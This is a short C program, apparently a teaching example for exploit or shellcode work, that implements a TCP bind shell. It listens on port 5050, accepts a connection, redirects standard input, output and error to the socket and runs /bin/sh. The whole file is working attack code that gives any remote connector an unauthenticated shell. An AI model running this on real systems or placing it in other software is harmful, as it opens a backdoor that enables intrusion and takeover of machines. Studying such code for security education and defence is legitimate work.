#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

int main()
{
    // 1. Create socket
    int listen_socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    // 2. Bind socket
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5050);
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(listen_socket_fd, (struct sockaddr *)&addr, sizeof(addr));

    // 3. Set socket into passive listening mode
    listen(listen_socket_fd, 0);

    // 4. Handle incoming connection
    int connected_socket_fd = accept(listen_socket_fd, NULL, NULL);

    // 5. Duplicate stdin, stdout and stderr file descriptors
    dup2(connected_socket_fd, STDIN_FILENO);  
    dup2(connected_socket_fd, STDOUT_FILENO);  
    dup2(connected_socket_fd, STDERR_FILENO);

    // 6. Spawn shell
    execve("/bin/sh", NULL, NULL);
}
